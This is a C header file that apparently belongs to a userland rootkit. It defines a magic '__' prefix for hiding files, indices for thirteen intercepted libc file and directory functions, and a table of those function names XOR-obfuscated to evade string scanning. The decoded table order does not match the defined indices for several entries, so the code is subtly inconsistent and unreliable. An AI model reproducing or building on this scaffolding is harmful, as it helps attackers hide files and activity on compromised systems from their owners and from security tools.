#define _GNU_SOURCE
#pragma once
//#define DEBUG_APP
#ifdef DEBUG_APP
#define DEBUG(...) fprintf(stderr, __VA_ARGS__);
#else
#define DEBUG(...)
#endif

#define MAGIC_STRING	"__"

#define SYS_ACCESS 0
#define SYS_READDIR 1
#define SYS_FOPEN 2
#define SYS_OPENDIR 3
#define SYS_OPEN 4
#define SYS_RMDIR 5
#define SYS_LINK 6
#define SYS_UNLINK 7
#define SYS_XSTAT 8
#define SYS_LXSTAT 9
#define SYS_UNLINKAT 10
#define SYS_MKDIR 11
#define SYS_MKDIRAT 12

#define SYSCALL_SIZE 13

static char *syscall_table[SYSCALL_SIZE] = {

"\x9f\x9d\x9d\x9b\x8d\x8d", "\x8c\x9b\x9f\x9a\x9a\x97\x8c", "\x98\x91\x8e\x9b\x90", "\x91\x8e\x9b\x90\x9a\x97\x8c", "\x91\x8e\x9b\x90", "\x8c\x93\x9a\x97\x8c", "\x92\x97\x90\x95", "\x8b\x90\x92\x97\x90\x95", "\x8b\x90\x92\x97\x90\x95\x9f\x8a", "\x8d\x8a\x9f\x8a", "\x92\x8d\x8a\x9f\x8a", "\x93\x95\x9a\x97\x8c", "\x93\x95\x9a\x97\x8c\x9f\x8a"};
